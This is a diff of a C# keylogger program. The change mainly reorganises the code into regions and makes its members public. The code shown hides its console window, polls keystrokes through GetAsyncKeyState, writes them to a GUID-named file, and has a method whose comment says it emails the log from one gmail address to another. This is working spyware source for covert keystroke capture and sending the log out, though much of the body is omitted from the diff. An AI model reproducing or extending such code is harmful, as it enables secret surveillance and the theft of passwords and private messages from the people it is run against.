@@ -7,14 +7,16 @@ namespace KeyLogger
 {
     class KeyLoggerClass
     {
+        #region Constants
+        public const int HOMEKEY = 36;
+        public const int ENDKEY = 35;
+        public const int ENTERKEY = 13;
+        public const int SPACEKEY = 32;
+        public const int SW_HIDE = 0;
+        public const int COUNTKEYS = 255;
+        #endregion
 
-        const int HOMEKEY = 36;
-        const int ENDKEY = 35;
-        const int ENTERKEY = 13;
-        const int SPACEKEY = 32;
-        const int SW_HIDE = 0;
-        const int COUNTKEYS = 255;
-
+        #region WinAPI
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
@@ -26,10 +28,11 @@ namespace KeyLogger
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
+        #endregion
+        #region FileWriting
         public static string filename = "3a277973-20e1-4549-9c9e-3f5ffa32c43c.txt"; // generated guid.newGuid()
         public static System.IO.StreamWriter myFile = null;
-
+        #endregion
 
         public static void Email_Send() // send log file from icanmakeyoucryo.o@gmail.com to d1mnewz@gmail.com
         {
@@ -51,9 +54,11 @@ namespace KeyLogger
             SmtpServer.Send(mail);
         }
 
-        private delegate bool ConsoleEventDelegate(int eventType);
+        #region ConsoleOnClose
 
-        static bool ConsoleEventCallback(int eventType)
+        public delegate bool ConsoleEventDelegate(int eventType);
+
+        public static bool ConsoleEventCallback(int eventType)
         {
             if (eventType == 2)
             {
@@ -64,10 +69,11 @@ namespace KeyLogger
             return false;
         } // when console closes
 
-        static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected
+        public static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected
 
+        #endregion
 
-        static void HideWindow()
+        public static void HideWindow()
         {
             var handle = GetConsoleWindow();
             // Hide
@@ -75,7 +81,8 @@ namespace KeyLogger
             // Show
             //ShowWindow(handle, SW_SHOW);
         }
-        static void Main(string[] args)
+
+        public static void Main(string[] args)
         {
             HideWindow();
             handler = new ConsoleEventDelegate(ConsoleEventCallback); // subscribe onclose event to ConsoleEventCallback
@@ -88,10 +95,8 @@ namespace KeyLogger
             myFile.WriteLineAsync(DateTime.Now.ToString()); // write date to top of file
             StartLogging();
         }
-
-   
     
-        static void StartLogging()
+        public static void StartLogging()
         {
             int lastKey = 0;
             while (true)
